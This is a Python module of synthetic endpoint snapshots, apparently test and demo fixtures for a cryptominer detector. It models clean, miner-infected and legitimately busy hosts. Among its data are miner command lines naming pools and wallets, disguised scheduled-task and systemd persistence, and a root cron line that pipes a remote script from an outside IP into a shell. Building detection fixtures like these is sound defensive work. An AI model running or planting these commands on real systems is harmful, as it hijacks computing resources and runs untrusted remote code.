"""Synthetic snapshots for demos and tests.

The fleet is chosen to exercise the interesting paths: a clean host, a CPU
miner hiding in a temp directory, a compromised Linux server with systemd
persistence, a cryptojacked browser tab, and a build server that pins every
core legitimately. The build server is the important one: it proves resource
pressure alone does not raise an alert.
"""

from __future__ import annotations

from .schemas import ConnectionIn, HostIn, PersistenceIn, ProcessIn, SnapshotIn


def _snapshot(host: HostIn, processes, connections=(), persistence=(), dns=()) -> SnapshotIn:
    return SnapshotIn(
        host=host,
        processes=list(processes),
        connections=list(connections),
        persistence=list(persistence),
        dns_queries=list(dns),
    )


def clean_workstation() -> SnapshotIn:
    return _snapshot(
        HostIn(hostname="PC-001", os="Windows", os_version="Windows-11-10.0.26100",
               ip_address="10.20.0.11", cpu_count=8, agent_version="1.0.0"),
        [
            ProcessIn(pid=4120, name="chrome.exe",
                      path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                      command_line=r'"C:\Program Files\Google\Chrome\Application\chrome.exe"',
                      username="CORP\\jdoe", parent_name="explorer.exe",
                      cpu_usage=12.0, cpu_share=1.5, cpu_average=11.0,
                      cpu_sustained_seconds=0.0, memory_usage=4.2, memory_rss_mb=680.0,
                      lifetime_seconds=620.0),
            ProcessIn(pid=980, name="svchost.exe", path=r"C:\Windows\System32\svchost.exe",
                      command_line=r"C:\Windows\System32\svchost.exe -k netsvcs",
                      username="NT AUTHORITY\\SYSTEM", parent_name="services.exe",
                      cpu_usage=1.0, cpu_average=0.8, lifetime_seconds=86400.0),
            ProcessIn(pid=7744, name="python.exe",
                      path=r"C:\Program Files\Python312\python.exe",
                      command_line=r"python.exe train.py", username="CORP\\jdoe",
                      cpu_usage=4.0, cpu_average=3.5, lifetime_seconds=140.0),
        ],
        [
            ConnectionIn(pid=4120, process_name="chrome.exe", destination_ip="142.250.74.110",
                         destination_domain="www.google.com", destination_port=443,
                         status="established", duration_seconds=120.0),
        ],
        [
            PersistenceIn(mechanism="registry_run", name="OneDrive",
                          target_path=r"C:\Program Files\Microsoft OneDrive\OneDrive.exe",
                          command=r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background',
                          source=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"),
        ],
        ["www.google.com", "outlook.office365.com"],
    )


def cpu_miner_workstation() -> SnapshotIn:
    """Classic XMRig drop: temp directory, stratum pool, scheduled task."""
    return _snapshot(
        HostIn(hostname="PC-002", os="Windows", os_version="Windows-10-10.0.19045",
               ip_address="10.20.0.12", cpu_count=8, agent_version="1.0.0"),
        [
            ProcessIn(pid=6612, name="system_service.exe",
                      path=r"C:\Users\mkim\AppData\Local\Temp\system_service.exe",
                      command_line=(
                          r"system_service.exe -o stratum+tcp://pool.supportxmr.com:3333 "
                          r"-u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD "
                          r"-p x --donate-level 1 --max-cpu-usage 90 --background"
                      ),
                      username="CORP\\mkim", parent_name="cmd.exe",
                      cpu_usage=94.0, cpu_share=92.0, cpu_average=91.5,
                      cpu_sustained_seconds=2100.0, memory_usage=3.1, memory_rss_mb=240.0,
                      thread_count=8, lifetime_seconds=2400.0),
            ProcessIn(pid=3312, name="explorer.exe", path=r"C:\Windows\explorer.exe",
                      command_line=r"C:\Windows\explorer.exe", username="CORP\\mkim",
                      cpu_usage=2.0, cpu_average=2.4, lifetime_seconds=30000.0),
        ],
        [
            ConnectionIn(pid=6612, process_name="system_service.exe",
                         destination_ip="51.15.58.224",
                         destination_domain="pool.supportxmr.com", destination_port=3333,
                         status="established", duration_seconds=2050.0, connection_count=6),
        ],
        [
            PersistenceIn(mechanism="scheduled_task", name="\\Microsoft\\Windows\\SystemUpdate",
                          target_path=r"C:\Users\mkim\AppData\Local\Temp\system_service.exe",
                          command=r"C:\Users\mkim\AppData\Local\Temp\system_service.exe -o stratum+tcp://pool.supportxmr.com:3333",
                          source="schtasks state=ready"),
        ],
        ["pool.supportxmr.com", "cdn.example.net"],
    )


def compromised_server() -> SnapshotIn:
    """Linux server with a renamed miner and a systemd unit for persistence."""
    return _snapshot(
        HostIn(hostname="SERVER-01", os="Linux", os_version="Linux-6.1.0-x86_64-debian-12",
               ip_address="10.20.1.5", cpu_count=16, agent_version="1.0.0"),
        [
            ProcessIn(pid=21877, name="kdevtmpfsi", path="/tmp/.cache/kdevtmpfsi",
                      command_line="/tmp/.cache/kdevtmpfsi --algo randomx --url 45.9.148.37:3333 --pass x --cpu-priority 5",
                      username="www-data", parent_name="sh",
                      cpu_usage=99.0, cpu_share=98.0, cpu_average=97.8,
                      cpu_sustained_seconds=7200.0, memory_usage=18.4, memory_rss_mb=2900.0,
                      thread_count=16, lifetime_seconds=7500.0),
            ProcessIn(pid=1, name="systemd", path="/usr/lib/systemd/systemd",
                      command_line="/sbin/init", username="root",
                      cpu_usage=0.3, cpu_average=0.4, lifetime_seconds=900000.0),
            ProcessIn(pid=940, name="nginx", path="/usr/sbin/nginx",
                      command_line="nginx: master process /usr/sbin/nginx",
                      username="root", cpu_usage=3.0, cpu_average=2.8,
                      lifetime_seconds=880000.0),
        ],
        [
            ConnectionIn(pid=21877, process_name="kdevtmpfsi", destination_ip="45.9.148.37",
                         destination_domain="xmr-eu1.nanopool.org", destination_port=14444,
                         status="established", duration_seconds=7100.0, connection_count=9),
            ConnectionIn(pid=940, process_name="nginx", destination_ip="93.184.216.34",
                         destination_domain="upstream.example.com", destination_port=443,
                         status="established", duration_seconds=300.0),
        ],
        [
            PersistenceIn(mechanism="systemd_service", name="network-monitor.service",
                          target_path="/tmp/.cache/kdevtmpfsi",
                          command="/tmp/.cache/kdevtmpfsi --algo randomx --url 45.9.148.37:3333",
                          source="/etc/systemd/system/network-monitor.service"),
            PersistenceIn(mechanism="cron_job", name="root",
                          target_path="/bin/sh",
                          command="/bin/sh -c 'curl -fsSL http://45.9.148.37/i.sh | sh'",
                          source="/var/spool/cron/crontabs/root"),
        ],
        ["xmr-eu1.nanopool.org", "j3k2m9xqv8zprt4w.duckdns.org"],
    )


def cryptojacked_browser() -> SnapshotIn:
    """Browser tab running an in-page miner."""
    return _snapshot(
        HostIn(hostname="PC-014", os="Windows", os_version="Windows-11-10.0.26100",
               ip_address="10.20.0.24", cpu_count=4, agent_version="1.0.0"),
        [
            ProcessIn(pid=8820, name="chrome.exe",
                      path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                      command_line=r'"chrome.exe" --type=renderer --renderer-client-id=7',
                      username="CORP\\alee", parent_name="chrome.exe",
                      cpu_usage=88.0, cpu_share=85.0, cpu_average=84.0,
                      cpu_sustained_seconds=900.0, memory_usage=6.0, memory_rss_mb=910.0,
                      thread_count=12, lifetime_seconds=1100.0, is_browser_renderer=True),
            ProcessIn(pid=8700, name="chrome.exe",
                      path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                      command_line=r'"chrome.exe"', username="CORP\\alee",
                      cpu_usage=6.0, cpu_average=5.0, lifetime_seconds=1200.0),
        ],
        [
            ConnectionIn(pid=8700, process_name="chrome.exe", destination_ip="104.28.16.9",
                         destination_domain="ws.coinimp.com", destination_port=443,
                         status="established", duration_seconds=880.0, connection_count=5),
        ],
        [],
        ["ws.coinimp.com", "www.streaming-example.com"],
    )


def busy_build_server() -> SnapshotIn:
    """Legitimate 100% CPU. Must not alert: no corroborating evidence."""
    return _snapshot(
        HostIn(hostname="BUILD-02", os="Linux", os_version="Linux-6.1.0-x86_64-ubuntu-22.04",
               ip_address="10.20.1.9", cpu_count=32, agent_version="1.0.0"),
        [
            ProcessIn(pid=4455, name="cc1plus", path="/usr/libexec/gcc/x86_64-linux-gnu/12/cc1plus",
                      command_line="/usr/libexec/gcc/x86_64-linux-gnu/12/cc1plus -O2 renderer.cpp",
                      username="builder", parent_name="make",
                      cpu_usage=100.0, cpu_share=99.0, cpu_average=99.5,
                      cpu_sustained_seconds=3600.0, memory_usage=12.0, memory_rss_mb=1800.0,
                      thread_count=1, lifetime_seconds=3700.0),
            ProcessIn(pid=4460, name="ffmpeg", path="/usr/bin/ffmpeg",
                      command_line="ffmpeg -i input.mkv -c:v libx264 -preset slow out.mp4",
                      username="builder", cpu_usage=97.0, cpu_share=95.0, cpu_average=96.0,
                      cpu_sustained_seconds=5400.0, memory_usage=4.0, lifetime_seconds=5500.0),
        ],
        [
            ConnectionIn(pid=4455, process_name="cc1plus", destination_ip="185.125.190.36",
                         destination_domain="archive.ubuntu.com", destination_port=443,
                         status="established", duration_seconds=40.0),
        ],
        [
            PersistenceIn(mechanism="systemd_service", name="buildkite-agent.service",
                          target_path="/usr/bin/buildkite-agent",
                          command="/usr/bin/buildkite-agent start",
                          source="/etc/systemd/system/buildkite-agent.service"),
        ],
        ["archive.ubuntu.com", "github.com"],
    )


def gpu_miner_workstation() -> SnapshotIn:
    """GPU mining: CPU stays low, so only GPU plus network catch it."""
    return _snapshot(
        HostIn(hostname="PC-031", os="Windows", os_version="Windows-11-10.0.26100",
               ip_address="10.20.0.41", cpu_count=12, agent_version="1.0.0"),
        [
            ProcessIn(pid=15220, name="nvcontainer.exe",
                      path=r"C:\Users\rpatel\Downloads\miner\nvcontainer.exe",
                      command_line=r"nvcontainer.exe --algo kawpow --pool eu.2miners.com:6060 --wallet 0x9f8c2b1a4d5e6f708192a3b4c5d6e7f809a1b2c3",
                      username="CORP\\rpatel", parent_name="explorer.exe",
                      cpu_usage=9.0, cpu_share=1.0, cpu_average=8.0,
                      cpu_sustained_seconds=0.0, gpu_usage=98.0,
                      memory_usage=2.0, lifetime_seconds=5400.0),
        ],
        [
            ConnectionIn(pid=15220, process_name="nvcontainer.exe", destination_ip="176.9.117.211",
                         destination_domain="eu.2miners.com", destination_port=6060,
                         status="established", duration_seconds=5200.0, connection_count=4),
        ],
        [
            PersistenceIn(mechanism="startup_folder", name="nvcontainer.lnk",
                          target_path=r"C:\Users\rpatel\Downloads\miner\nvcontainer.exe",
                          command=r"C:\Users\rpatel\Downloads\miner\nvcontainer.exe",
                          source=r"C:\Users\rpatel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"),
        ],
        ["eu.2miners.com"],
    )


def fleet() -> list[SnapshotIn]:
    return [
        clean_workstation(),
        cpu_miner_workstation(),
        compromised_server(),
        cryptojacked_browser(),
        busy_build_server(),
        gpu_miner_workstation(),
    ]


